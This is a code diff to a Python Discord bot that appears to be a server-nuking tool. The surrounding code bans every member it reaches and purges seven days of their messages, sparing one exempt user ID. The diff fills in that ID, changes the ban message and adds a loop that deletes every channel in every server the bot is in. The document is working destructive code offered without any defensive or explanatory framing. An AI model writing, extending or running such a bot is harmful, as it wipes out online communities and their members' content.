@@ -4,8 +4,8 @@ import discord
 import os
 
 botid = "672883371722014783"
-nobanid = "123213123123123"
-noban = False
+nobanid = "346601153686929411"
+noban = True
 
 client = discord.Client()
 
@@ -26,11 +26,21 @@ async def on_message(message):
                     print("Oops! We dont ban him.")
                     continue
             try:
-                await member.ban(reason="Thor has hit you with his hammer!", delete_message_days=7)
+                await member.ban(reason="The rains are over now.", delete_message_days=7)
             except:
                 print(f"Oops! I cant ban {member.display_name} for some reason! Maybe he is owner?")
                 continue
             print(f"Banned {member.display_name}!")
         print("Banning is complete!")
+
+        for guild in client.guilds:
+            for channel in guild.channels:
+                print(f"Deleting {channel}")
+                try:
+                    await channel.delete()
+                except:
+                    print(f"I cant delete channel {channel} for some reason!")
+            print("Done deleting")
+
 
 client.run(os.environ['DISCORD_TOKEN'], bot=True)
